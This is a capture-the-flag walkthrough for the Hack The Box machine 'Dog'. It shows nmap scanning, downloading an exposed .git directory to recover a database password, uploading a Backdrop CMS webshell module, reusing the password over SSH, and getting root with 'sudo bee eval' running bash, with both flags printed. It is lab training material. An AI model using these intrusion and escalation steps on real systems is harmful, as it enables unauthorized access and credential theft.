# Dog

> References:
>
> - <https://0xdf.gitlab.io/2025/07/12/htb-dog.html>

## Port Scanning

```bash
sudo nmap -vv -sC -sV -T4 -A <target IP>
```

Results:

```txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD
| http-robots.txt: 22 disallowed entries
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.97%E=4%D=7/25%OT=22%CT=1%CU=32543%PV=Y%DS=2%DC=T%G=Y%TM=688435B
OS:D%P=arm-apple-darwin24.4.0)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=106%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=
OS:M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:52NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=4
OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)
...
```

## Download Git Directory

```bash
wget -r -np -R "index.html*" http://10.10.11.58/.git
```

With `.git` directory, we can recover all files in the Git repo. From these files, we can find a database password in `settings.php`.

## Webshell

Try to upload a module to the target website. Here is the [a Backdrop module](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar) with Webshell.

```bash
tar xf reference.tar
```

We can establish a reverse shell now, but there is a cleanup task running at the background. By inspecting `/etc/passwd` file or `/home` directory, we can find users on the target machine. Now, let's try the password in the setting to see if we can `ssh` into the machine.

## Get the Flag

After logining into the account, we can find a flag file in the user's home directory.

```txt
johncusack@dog:~$ ls -alh
total 28K
drwxr-xr-x 3 johncusack johncusack 4.0K Feb  7  2025 .
drwxr-xr-x 4 root       root       4.0K Aug 15  2024 ..
lrwxrwxrwx 1 root       root          9 Feb  7  2025 .bash_history -> /dev/null
-rw-r--r-- 1 johncusack johncusack  220 Aug 15  2024 .bash_logout
-rw-r--r-- 1 johncusack johncusack 3.7K Aug 15  2024 .bashrc
drwx------ 2 johncusack johncusack 4.0K Aug 16  2024 .cache
lrwxrwxrwx 1 root       root          9 Feb  7  2025 .mysql_history -> /dev/null
-rw-r--r-- 1 johncusack johncusack  807 Aug 15  2024 .profile
-rw-r----- 1 root       johncusack   33 Aug 15 20:43 user.txt
johncusack@dog:~$ cat user.txt
08f688985833e8e5a42f0559c2ea7221
```

## Get the Root Flag

```txt
johncusack@dog:~$ sudo -l
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```txt
johncusack@dog:~$ sudo bee --root=/var/www/html eval "system('bash')"
root@dog:/var/www/html# cd /root
root@dog:~# ls
root.txt
root@dog:~# cat root.txt
538167603e6b1517d85e06866c26551a
```
